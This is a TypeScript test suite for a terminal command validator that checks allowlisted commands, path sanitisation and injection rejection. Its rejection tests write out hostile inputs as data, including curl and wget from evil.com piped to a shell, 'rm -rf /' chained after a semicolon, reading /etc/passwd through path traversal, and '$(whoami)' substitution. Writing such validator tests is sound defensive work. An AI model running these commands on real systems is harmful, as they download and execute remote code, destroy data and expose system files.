/**
 * Tests for Terminal Command Validator
 *
 * Comprehensive security-focused tests for command validation
 */

import * as assert from 'assert';
import {
    TerminalCommandValidator,
    ValidationError,
    ValidationResult
} from '../terminalCommandValidator';

suite('TerminalCommandValidator', () => {
    suite('validateCommand', () => {
        test('should accept safe victor commands', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat');
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.error, undefined);
        });

        test('should accept vic commands', () => {
            const result = TerminalCommandValidator.validateCommand('vic chat --provider anthropic');
            assert.strictEqual(result.valid, true);
        });

        test('should accept python commands', () => {
            const result = TerminalCommandValidator.validateCommand('python --version');
            assert.strictEqual(result.valid, true);
        });

        test('should accept npm commands', () => {
            const result = TerminalCommandValidator.validateCommand('npm install');
            assert.strictEqual(result.valid, true);
        });

        test('should accept git commands', () => {
            const result = TerminalCommandValidator.validateCommand('git status');
            assert.strictEqual(result.valid, true);
        });

        test('should accept commands with multiple arguments', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --provider anthropic --model claude-sonnet-4-5');
            assert.strictEqual(result.valid, true);
        });

        test('should reject empty commands', () => {
            const result = TerminalCommandValidator.validateCommand('');
            assert.strictEqual(result.valid, false);
            assert.ok(result.error instanceof ValidationError);
            assert.strictEqual(result.error?.category, 'command');
        });

        test('should reject whitespace-only commands', () => {
            const result = TerminalCommandValidator.validateCommand('   ');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with semicolon', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat; rm -rf /');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error?.category, 'pattern');
            assert.ok(result.error?.message.includes('Dangerous pattern'));
        });

        test('should reject commands with pipe', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat | cat');
            assert.strictEqual(result.valid, false);
            assert.ok(result.error?.message.includes('Dangerous pattern'));
        });

        test('should reject commands with command substitution', () => {
            const result = TerminalCommandValidator.validateCommand('victor $(whoami)');
            assert.strictEqual(result.valid, false);
            assert.ok(result.error?.message.includes('Dangerous pattern'));
        });

        test('should reject commands with backtick substitution', () => {
            const result = TerminalCommandValidator.validateCommand('echo `date`');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with ${} substitution', () => {
            const result = TerminalCommandValidator.validateCommand('echo ${HOME}');
            assert.strictEqual(result.valid, false);
        });

        test('should reject unknown commands', () => {
            const result = TerminalCommandValidator.validateCommand('malicious_command --arg');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error?.category, 'command');
            assert.ok(result.error?.message.includes('not in allowlist'));
        });

        test('should reject commands with path traversal', () => {
            const result = TerminalCommandValidator.validateCommand('cat ../../../etc/passwd');
            assert.strictEqual(result.valid, false);
            assert.ok(result.error?.message.includes('Dangerous pattern'));
        });

        test('should reject commands with hex escape sequences', () => {
            const result = TerminalCommandValidator.validateCommand('echo \\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with newline injection', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat\necho injected');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with tab injection', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat\tinjected');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with eval', () => {
            const result = TerminalCommandValidator.validateCommand('eval malicious_code');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with exec', () => {
            const result = TerminalCommandValidator.validateCommand('exec /bin/bash');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with output redirect', () => {
            const result = TerminalCommandValidator.validateCommand('echo data > /tmp/file');
            assert.strictEqual(result.valid, false);
        });

        test('should reject commands with background execution', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat &');
            assert.strictEqual(result.valid, false);
        });

        test('should reject curl piped to shell', () => {
            const result = TerminalCommandValidator.validateCommand('curl http://evil.com | bash');
            assert.strictEqual(result.valid, false);
        });

        test('should reject wget piped to shell', () => {
            const result = TerminalCommandValidator.validateCommand('wget http://evil.com/shell.sh | sh');
            assert.strictEqual(result.valid, false);
        });

        test('should reject command chaining with semicolon', () => {
            const result = TerminalCommandValidator.validateCommand('git status; ls -la');
            assert.strictEqual(result.valid, false);
        });

        test('should accept safe flags', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --help');
            assert.strictEqual(result.valid, true);
        });

        test('should accept version flag', () => {
            const result = TerminalCommandValidator.validateCommand('victor --version');
            assert.strictEqual(result.valid, true);
        });

        test('should accept verbose flag', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --verbose');
            assert.strictEqual(result.valid, true);
        });

        test('should accept short flags', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat -v');
            assert.strictEqual(result.valid, true);
        });

        test('should accept multiple short flags', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat -vvv');
            assert.strictEqual(result.valid, true);
        });

        test('should accept flag with value', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --provider anthropic');
            assert.strictEqual(result.valid, true);
        });

        test('should accept flag with equals syntax', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --provider=anthropic');
            assert.strictEqual(result.valid, true);
        });

        test('should accept pytest commands', () => {
            const result = TerminalCommandValidator.validateCommand('pytest tests/ -v');
            assert.strictEqual(result.valid, true);
        });

        test('should accept npm install with flags', () => {
            const result = TerminalCommandValidator.validateCommand('npm install --save-dev typescript');
            assert.strictEqual(result.valid, true);
        });

        test('should accept git commands with flags', () => {
            const result = TerminalCommandValidator.validateCommand('git log --oneline --graph --all');
            assert.strictEqual(result.valid, true);
        });

        test('should accept docker commands', () => {
            const result = TerminalCommandValidator.validateCommand('docker ps');
            assert.strictEqual(result.valid, true);
        });

        test('should accept make commands', () => {
            const result = TerminalCommandValidator.validateCommand('make test');
            assert.strictEqual(result.valid, true);
        });

        test('should accept pip commands', () => {
            const result = TerminalCommandValidator.validateCommand('pip install --upgrade victor-ai');
            assert.strictEqual(result.valid, true);
        });

        test('should accept yarn commands', () => {
            const result = TerminalCommandValidator.validateCommand('yarn add lodash');
            assert.strictEqual(result.valid, true);
        });

        test('should accept cargo commands', () => {
            const result = TerminalCommandValidator.validateCommand('cargo build --release');
            assert.strictEqual(result.valid, true);
        });

        test('should accept go commands', () => {
            const result = TerminalCommandValidator.validateCommand('go test ./...');
            assert.strictEqual(result.valid, true);
        });
    });

    suite('sanitizePath', () => {
        test('should remove shell metacharacters from paths', () => {
            const input = '/path/to/file;echo malicious';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.strictEqual(result, '/path/to/fileecho malicious');
            assert.ok(!result.includes(';'));
        });

        test('should remove pipes from paths', () => {
            const input = '/path/to/file|cat';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('|'));
        });

        test('should remove backticks from paths', () => {
            const input = '/path/to/`whoami`';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('`'));
        });

        test('should remove dollar signs from paths', () => {
            const input = '/path/$HOME/file';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('$'));
        });

        test('should remove parentheses from paths', () => {
            const input = '/path/(malicious)/file';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('('));
        });

        test('should remove newlines from paths', () => {
            const input = '/path/to/file\ninjected';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('\n'));
        });

        test('should remove tabs from paths', () => {
            const input = '/path/to/file\tinjected';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('\t'));
        });

        test('should remove command substitution from paths', () => {
            const input = '/path/$(whoami)/file';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('$('));
        });

        test('should remove brace substitution from paths', () => {
            const input = '/path/${USER}/file';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.ok(!result.includes('${'));
        });

        test('should preserve safe paths', () => {
            const input = '/Users/username/projects/victor';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.strictEqual(result, input);
        });

        test('should preserve relative paths without special chars', () => {
            const input = './src/test';
            const result = TerminalCommandValidator.sanitizePath(input);
            assert.strictEqual(result, input);
        });

        test('should preserve Windows-style paths', () => {
            const input = 'C:\\Users\\username\\project';
            const result = TerminalCommandValidator.sanitizePath(input);
            // Should preserve backslashes (Windows path separators)
            // but remove dangerous characters
            assert.ok(result.includes('C:'));
        });
    });

    suite('validateWorkspacePath', () => {
        test('should accept valid absolute paths', () => {
            // Note: This test might fail on different systems
            // In real tests, we'd mock fs.existsSync and fs.statSync
            const result = TerminalCommandValidator.validateWorkspacePath('/tmp');
            // Just check the structure, not the result (depends on filesystem)
            assert.ok(typeof result.valid === 'boolean');
        });

        test('should reject paths with traversal', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('/etc/../tmp');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error?.category, 'path');
            assert.ok(result.error?.message.includes('traversal'));
        });

        test('should reject paths with .. in middle', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('/tmp/../etc/passwd');
            assert.strictEqual(result.valid, false);
        });

        test('should reject relative paths with ..', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('../workspace');
            assert.strictEqual(result.valid, false);
        });

        test('should reject multiple path traversal', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('../../../../etc/passwd');
            assert.strictEqual(result.valid, false);
        });

        test('should reject URL-encoded path traversal', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('/tmp%2f../etc');
            assert.strictEqual(result.valid, false);
        });

        test('should reject Windows-encoded path traversal', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('/tmp%5c../etc');
            assert.strictEqual(result.valid, false);
        });

        test('should return sanitized path for valid input', () => {
            // Test with a path that needs sanitization but exists
            const result = TerminalCommandValidator.validateWorkspacePath('/tmp');
            if (result.valid && result.sanitized) {
                assert.ok(result.sanitized.length > 0);
            }
        });

        test('should handle empty path gracefully', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('');
            // Empty path resolves to current directory
            // Result depends on whether '.' exists
            assert.ok(typeof result.valid === 'boolean');
        });

        test('should reject non-existent paths', () => {
            const result = TerminalCommandValidator.validateWorkspacePath('/this/path/does/not/exist/12345');
            if (!result.valid) {
                assert.strictEqual(result.error?.category, 'workspace');
                assert.ok(result.error?.message.includes('not found') ||
                          result.error?.message.includes('traversal'));
            }
        });
    });

    suite('validateArguments', () => {
        test('should accept safe arguments', () => {
            const result = TerminalCommandValidator.validateArguments([
                '--verbose',
                '--output',
                'result.txt'
            ]);
            assert.strictEqual(result.valid, true);
        });

        test('should accept file paths as arguments', () => {
            const result = TerminalCommandValidator.validateArguments([
                '/Users/test/project/file.ts',
                '--output',
                '/Users/test/project/output.txt'
            ]);
            assert.strictEqual(result.valid, true);
        });

        test('should accept URLs as arguments', () => {
            const result = TerminalCommandValidator.validateArguments([
                'https://github.com/user/repo'
            ]);
            assert.strictEqual(result.valid, true);
        });

        test('should reject arguments with semicolon', () => {
            const result = TerminalCommandValidator.validateArguments([
                'file.txt',
                '--arg',
                'value;rm -rf /'
            ]);
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error?.category, 'pattern');
        });

        test('should reject arguments with pipe', () => {
            const result = TerminalCommandValidator.validateArguments([
                'value|cat'
            ]);
            assert.strictEqual(result.valid, false);
        });

        test('should reject arguments with command substitution', () => {
            const result = TerminalCommandValidator.validateArguments([
                '$(whoami)'
            ]);
            assert.strictEqual(result.valid, false);
        });

        test('should reject arguments with backticks', () => {
            const result = TerminalCommandValidator.validateArguments([
                '`date`'
            ]);
            assert.strictEqual(result.valid, false);
        });

        test('should accept arguments with dots (file extensions)', () => {
            const result = TerminalCommandValidator.validateArguments([
                'file.test.ts',
                'data.json',
                'archive.tar.gz'
            ]);
            assert.strictEqual(result.valid, true);
        });

        test('should accept arguments with hyphens', () => {
            const result = TerminalCommandValidator.validateArguments([
                'my-file-name.txt',
                '--test-flag'
            ]);
            assert.strictEqual(result.valid, true);
        });

        test('should accept arguments with underscores', () => {
            const result = TerminalCommandValidator.validateArguments([
                'my_file_name.py',
                'test_data.json'
            ]);
            assert.strictEqual(result.valid, true);
        });
    });

    suite('allowlist management', () => {
        test('should extend command allowlist', () => {
            const customCommands = ['customcmd', 'anothercmd'];
            TerminalCommandValidator.extendAllowlist(customCommands);

            const result1 = TerminalCommandValidator.validateCommand('customcmd test');
            const result2 = TerminalCommandValidator.validateCommand('anothercmd test');

            assert.strictEqual(result1.valid, true);
            assert.strictEqual(result2.valid, true);
        });

        test('should extend flag allowlist', () => {
            const customFlags = ['--custom-flag', '--another-flag'];
            TerminalCommandValidator.extendFlagAllowlist(customFlags);

            // Just verify it doesn't throw - flags are permissive by design
            const result = TerminalCommandValidator.validateCommand('victor chat --custom-flag value');
            assert.strictEqual(result.valid, true);
        });

        test('should not add duplicates to command allowlist', () => {
            const allowlist = TerminalCommandValidator.getAllowlist();
            const originalLength = allowlist.length;

            TerminalCommandValidator.extendAllowlist(['victor', 'vic']);
            const newAllowlist = TerminalCommandValidator.getAllowlist();

            // Should not have duplicates
            assert.strictEqual(newAllowlist.length, originalLength);
        });

        test('should return copy of allowlist', () => {
            const allowlist1 = TerminalCommandValidator.getAllowlist();
            const allowlist2 = TerminalCommandValidator.getAllowlist();

            // Should be equal but not the same reference
            assert.deepStrictEqual(allowlist1, allowlist2);
            assert.notStrictEqual(allowlist1, allowlist2);
        });

        test('should return copy of flag allowlist', () => {
            const flags1 = TerminalCommandValidator.getFlagAllowlist();
            const flags2 = TerminalCommandValidator.getFlagAllowlist();

            assert.deepStrictEqual(flags1, flags2);
            assert.notStrictEqual(flags1, flags2);
        });
    });

    suite('edge cases', () => {
        test('should handle very long commands', () => {
            const longArg = 'a'.repeat(10000);
            const result = TerminalCommandValidator.validateCommand(`victor chat ${longArg}`);
            // Should just check for dangerous patterns
            assert.strictEqual(result.valid, true);
        });

        test('should handle unicode characters in commands', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --message "你好世界"');
            assert.strictEqual(result.valid, true);
        });

        test('should handle special but safe characters', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat --message "test-data_v1.0"');
            assert.strictEqual(result.valid, true);
        });

        test('should handle multiple spaces', () => {
            const result = TerminalCommandValidator.validateCommand('victor    chat    --verbose');
            assert.strictEqual(result.valid, true);
        });

        test('should handle trailing spaces', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat   ');
            assert.strictEqual(result.valid, true);
        });

        test('should handle leading spaces', () => {
            const result = TerminalCommandValidator.validateCommand('   victor chat');
            assert.strictEqual(result.valid, true);
        });

        test('should reject mixed case command injection attempts', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat; ECHO malicious');
            assert.strictEqual(result.valid, false);
        });

        test('should reject null bytes', () => {
            const result = TerminalCommandValidator.validateCommand('victor chat\x00injected');
            // Our validator catches newlines, should also handle null
            assert.strictEqual(result.valid, false);
        });

        test('should handle empty arguments', () => {
            const result = TerminalCommandValidator.validateArguments([]);
            assert.strictEqual(result.valid, true);
        });

        test('should handle single character commands', () => {
            // Most single char commands won't be in allowlist
            const result = TerminalCommandValidator.validateCommand('x');
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error?.category, 'command');
        });
    });

    suite('ValidationError', () => {
        test('should create error with message and category', () => {
            const error = new ValidationError('Test error', 'command');
            assert.strictEqual(error.message, 'Test error');
            assert.strictEqual(error.category, 'command');
            assert.strictEqual(error.name, 'ValidationError');
        });

        test('should create error with details', () => {
            const details = 'Additional error information';
            const error = new ValidationError('Test error', 'pattern', details);
            assert.strictEqual(error.details, details);
        });

        test('should support all error categories', () => {
            const categories: Array<'command' | 'path' | 'pattern' | 'workspace'> = [
                'command',
                'path',
                'pattern',
                'workspace'
            ];

            categories.forEach(category => {
                const error = new ValidationError('Test', category);
                assert.strictEqual(error.category, category);
            });
        });
    });

    suite('ValidationResult', () => {
        test('should create valid result', () => {
            const result: ValidationResult = { valid: true };
            assert.strictEqual(result.valid, true);
            assert.strictEqual(result.error, undefined);
        });

        test('should create invalid result with error', () => {
            const error = new ValidationError('Test error', 'command');
            const result: ValidationResult = { valid: false, error };
            assert.strictEqual(result.valid, false);
            assert.strictEqual(result.error, error);
        });

        test('should include sanitized string when provided', () => {
            const result: ValidationResult = {
                valid: true,
                sanitized: '/sanitized/path'
            };
            assert.strictEqual(result.sanitized, '/sanitized/path');
        });
    });
});
